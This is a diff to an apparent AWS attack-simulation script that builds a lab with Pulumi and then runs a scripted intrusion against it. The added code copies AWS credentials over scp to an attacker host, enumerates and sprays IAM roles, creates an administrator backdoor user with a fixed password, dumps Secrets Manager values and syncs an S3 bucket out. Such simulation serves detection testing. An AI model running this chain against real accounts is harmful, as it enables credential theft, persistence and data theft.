@@ -1,4 +1,5 @@
 import os
+import shlex
 import sys
 import re
 import pyfiglet
@@ -22,11 +23,16 @@ class ScenarioExecution:
         self.compromised_ec2_external_ip = None
         self.attacker_ec2_external_ip = None
         self.lambda_role_arn = None
+        self.exfil_bucket_name = None
         self.compromised_ec2_key = "./compromised_id_rsa"
         self.attacker_ec2_key = "./attacker_id_rsa"
         self.attacker_env_vars = {}
 
         self.discovered_roles = []
+        self.discovered_buckets = []
+        self.discovered_secrets = []
+
+        self.accessible_roles = []
 
     def read_pulumi_config(self):
         with open("./core/cobra-scenario-8-output.json", "r") as file:
@@ -35,6 +41,8 @@ class ScenarioExecution:
         self.agent_included = data['Agent Included']
         self.attacker_ec2_external_ip = data['Attacker Server Public IP']
         self.lambda_role_arn = data['Lambda Role ARN']
+        self.iam_monitor_role_arn = data['IAM Monitor Role ARN']
+        self.exfil_bucket_name = data['Bucket Name']
 
         if self.agent_included:
             self.compromised_ec2_external_ip = data['Compromised Server Public IP']
@@ -44,19 +52,14 @@ class ScenarioExecution:
             self.attacker_env_vars['AWS_REGION'] = data['Region']
 
     def init_infra(self):
-        file_path = "./core/cobra-scenario-8-output.json"
-        if os.path.exists(file_path):
-            os.remove(file_path)
-            print("File '{}' found and deleted.".format(file_path))
-        else:
-            print("File '{}' not found.".format(file_path))
-
-        generate_ssh_key(self.compromised_ec2_key)
-        generate_ssh_key(self.attacker_ec2_key)
+        if not os.path.exists(self.compromised_ec2_key):
+            generate_ssh_key(self.compromised_ec2_key)
+        if not os.path.exists(self.attacker_ec2_key):
+            generate_ssh_key(self.attacker_ec2_key)
 
         run_subprocess("cd ./scenarios/scenario_8/infra/ && pulumi up -s cobra-scenario-8 -y")
         run_subprocess(
-            "cd ./scenarios/scenario_8/infra/ && pulumi stack -s cobra-scenario-8 output --json --show-secrets >> ../../../core/cobra-scenario-8-output.json"
+            "cd ./scenarios/scenario_8/infra/ && pulumi stack -s cobra-scenario-8 output --json --show-secrets > ../../../core/cobra-scenario-8-output.json"
         )
 
         # TODO: Move config read and members init into seperate function
@@ -85,7 +88,7 @@ class ScenarioExecution:
 
         print(colored("Agent connected!", color="green"))
 
-    def attacker_run(self, cmdline, return_output=False):
+    def attacker_run(self, cmdline, return_output=False, check=False):
         # Build the export string from the class state
         env_prefix = ""
         if self.attacker_env_vars:
@@ -95,12 +98,12 @@ class ScenarioExecution:
         # Prepend it to the user's command
         full_remote_cmd = f"{env_prefix}{cmdline}"
 
-        escaped_cmd = full_remote_cmd.replace('"', '\\"')
+        escaped_cmd = shlex.quote(full_remote_cmd)
 
         # Construct the SSH wrapper
-        nested_cmdline = f'ssh -o StrictHostKeyChecking=no -i {self.attacker_ec2_key} ubuntu@{self.attacker_ec2_external_ip} "{escaped_cmd}"'
+        nested_cmdline = f'ssh -o StrictHostKeyChecking=no -i {self.attacker_ec2_key} ubuntu@{self.attacker_ec2_external_ip} {escaped_cmd}'
 
-        result = run_subprocess(nested_cmdline, return_output=return_output, check=False)
+        result = run_subprocess(nested_cmdline, return_output=return_output, check=check)
         return result
 
     def wait_for_attacker(self):
@@ -119,21 +122,38 @@ class ScenarioExecution:
 
     def attempt_recon(self):
         # List buckets
-        result = self.attacker_run("aws s3 ls")
-        print(colored(f"S3 enumeration attempt result: error_code={result}", "red"))
+        result = self.attacker_run('aws s3api list-buckets | jq ".Buckets[].Name"', return_output=True)
+        self.discovered_buckets = [name.strip('"') for name in result.split()]
+        if self.discovered_buckets:
+            print(colored(f"Buckets enumeration attempt discovered: {len(self.discovered_buckets)}", "red"))
+        else:
+            print(colored("Buckets enumeration attempt failed", "red"))
 
         # List secrets
-        result = self.attacker_run("aws secretsmanager list-secrets")
-        print(colored(f"Secrets enumeration attempt result: error_code={result}", "red"))
+        result = self.attacker_run('aws secretsmanager list-secrets | jq ".SecretList[].Name"', return_output=True)
+        self.discovered_secrets = [name.strip('"') for name in result.split()]
+        if self.discovered_secrets:
+            print(colored(f"Secrets enumeration attempt discovered: {len(self.discovered_secrets)}", "red"))
+        else:
+            print(colored("Secrets enumeration attempt failed", "red"))
 
         # List roles
         result = self.attacker_run('aws iam list-roles | jq ".Roles[].Arn"', return_output=True)
         self.discovered_roles = [arn.strip('"') for arn in result.split()]
-        print(colored(f"IAM roles enumeration attempt result: {result}", "red"))
+        if self.discovered_roles:
+            print(colored(f"IAM roles enumeration attempt discovered {len(self.discovered_roles)} roles", "red"))
+        else:
+            print(colored("IAM roles enumeration attempt failed", "red"))
+
+    def secrets_dump(self):
+        for secret_name in self.discovered_secrets:
+            cmdline = f'aws secretsmanager get-secret-value --secret-id "{secret_name}"'
+            res = self.attacker_run(cmdline, check=True)
+            if res != 0:
+                print(colored(f"Secrets dump failed with error_code={res}, aborting...", "red"))
+                exit(1)
 
     def attacker_assume_role(self, role_arn, session_name="DebuggingSession", update_env=True, check=True):
-        print(colored(f"Attempting to assume role: {role_arn}...", "yellow"))
-
         cmd = f"aws sts assume-role --role-arn {role_arn} --role-session-name {session_name} --output json"
         output = self.attacker_run(cmd, return_output=True)
 
@@ -148,20 +168,44 @@ class ScenarioExecution:
                 print(colored("Environment updated.", "red"))
 
             print(colored(f"Successfully assumed role!", "red"))
+            return True
 
         except (json.JSONDecodeError, KeyError) as e:
-            print(colored(f"Failed to assume-role", "red"))
             # Ensure success if check flag is supplied
             if check:
+                print(colored(f"Failed to assume-role", "red"))
                 raise e
+
+            return False
 
     def attempt_backdoor(self):
         # Create new user
+        error_code = self.attacker_run("aws iam create-user --user-name test-user-demo8")
+        if error_code != 0:
+            print(colored("Failed to create new IAM user", "red"))
+            return False
 
         # Attach admin policy
+        error_code = self.attacker_run(
+            "aws iam attach-user-policy --user-name test-user-demo8 --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
+        )
+        if error_code != 0:
+            print(colored("Failed to attach admin policy to new IAM user", "red"))
+            return False
 
         # Create password/key for user
-        pass
+        error_code = self.attacker_run(
+            "aws iam create-login-profile --user-name test-user-demo8 --password VerySecure123@")
+        if error_code != 0:
+            print(colored("Failed to create login profile for new IAM user", "red"))
+            return False
+
+        print(colored("Backdoor user created successfully!", "red"))
+        return True
+
+    def s3_exfiltration(self):
+        s3_cmd = f"aws s3 sync s3://{self.exfil_bucket_name} /home/ubuntu/stolen_data/"
+        self.attacker_run(s3_cmd, check=True)
 
     def scenario_8_execute(self):
 
@@ -194,6 +238,7 @@ class ScenarioExecution:
                                                   key_path="./attacker_id_rsa")
 
             # Local AWS CLI credentials are exfilterated onto attacker's machine
+            print(colored("Exfiltration AWS credentials from compromised machine onto attacker's machine", color="red"))
             self.attacker_run(
                 f"scp -i compromised_id_rsa ubuntu@{self.compromised_ec2_external_ip}:~/.aws/credentials ./.aws/credentials"
             )
@@ -205,17 +250,65 @@ class ScenarioExecution:
             # Without agent the scenario begins with the attackers using the compromised dev user AWS CLI credentials
 
         # Recon attempts will fail since initial compromised user has low privileges
+        print(
+            colored(
+                "Attempting recon & backdoor user creation, other than roles discovery this should fail due to lack of permissions",
+                "red"))
         self.attempt_recon()
+        self.attempt_backdoor()
 
         # Assume lambda role
+        print(colored(f"Attempting to assume lambda role...", "yellow"))
         self.attacker_assume_role(self.lambda_role_arn)
+
+        # Will fail since privileges are still not sufficient
+        print(
+            colored("Attempting backdoor user creation again, this should still fail due to lack of permissions",
+                    "red"))
+        self.attempt_backdoor()
 
         # AssumeRole spray
         if self.discovered_roles:
-            print(colored(f"Spraying {len(self.discovered_roles)} discovered roles...", "red"))
+            print(colored(f"Spraying AssumeRole on {len(self.discovered_roles)} discovered roles...", "red"))
 
             for role_arn in tqdm(self.discovered_roles):
-                self.attacker_assume_role(role_arn, update_env=False, check=False)
+                if self.attacker_assume_role(role_arn, update_env=False, check=False):
+                    self.accessible_roles.append(role_arn)
+
+        if self.iam_monitor_role_arn not in self.accessible_roles:
+            print(
+                colored("Could not assume IAM Monitor role which is mandatory for the rest of the scenario, exiting...",
+                        "red"))
+            exit(1)
+
+        # Use higher privileges discovered role
+        print(colored(f"Attempting to assume IAM monitor role...", "yellow"))
+        self.attacker_assume_role(self.iam_monitor_role_arn)
+        self.attempt_backdoor()
+        self.attempt_recon()
+
+        # Secrets dump
+        print(colored("Dumping secrets...", "red"))
+        self.secrets_dump()
+
+        # Exfiltration from S3
+        if self.exfil_bucket_name not in self.discovered_buckets:
+            print(colored("Scenario bucket for exfiltration was not found in discovered buckets, aborting...", "red"))
+            exit(1)
+
+        print(colored("Exfiltrating S3 data...", "red"))
+        self.s3_exfiltration()
 
     def post_execution(self):
         pass
+
+    def scenario_8_destroy(self):
+        print(colored("Removing backdoor user...", "red"))
+        run_subprocess("aws iam delete-login-profile --user-name test-user-demo8", check=False)
+        run_subprocess(
+            "aws iam detach-user-policy --user-name test-user-demo8 --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
+            check=False)
+        run_subprocess("aws iam delete-user --user-name test-user-demo8", check=False)
+
+        print(colored("Destroying infra...", "red"))
+        run_subprocess("cd ./scenarios/scenario_8/infra && pulumi destroy -s cobra-scenario-8 --yes")
